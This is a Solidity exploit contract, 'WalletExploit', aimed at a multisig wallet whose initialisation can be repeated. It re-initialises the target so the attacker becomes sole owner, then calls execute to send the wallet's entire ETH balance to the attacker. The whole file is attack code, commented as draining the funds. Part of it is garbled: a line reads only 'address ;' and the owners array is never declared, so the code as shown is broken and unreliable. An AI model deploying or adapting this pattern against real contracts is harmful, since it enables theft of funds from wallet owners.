// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

interface IVulnerableWallet {
    function initWallet(address[] _owners, uint _required, uint _daylimit) external;
    function execute(address _to, uint _value, bytes _data) external returns (bytes32);
}

contract WalletExploit {
    address public attacker;
    IVulnerableWallet public target;

    constructor(address _target) public {
        attacker = msg.sender;
        target = IVulnerableWallet(_target);
    }

    // Step 1: re-initialize the wallet and make attacker the sole owner
    function reinitialize() public {
        address ;
        // Push attacker as only owner
        newOwners.length = 1;
        newOwners[0] = attacker;
        target.initWallet(newOwners, 1, 1 ether); // set daily limit high enough
    }

    // Step 2: withdraw ETH to attacker's address
    function withdraw() public {
        require(msg.sender == attacker);

        bytes memory data; // empty call data
        target.execute(attacker, address(target).balance, data); // drain all ETH
    }
}

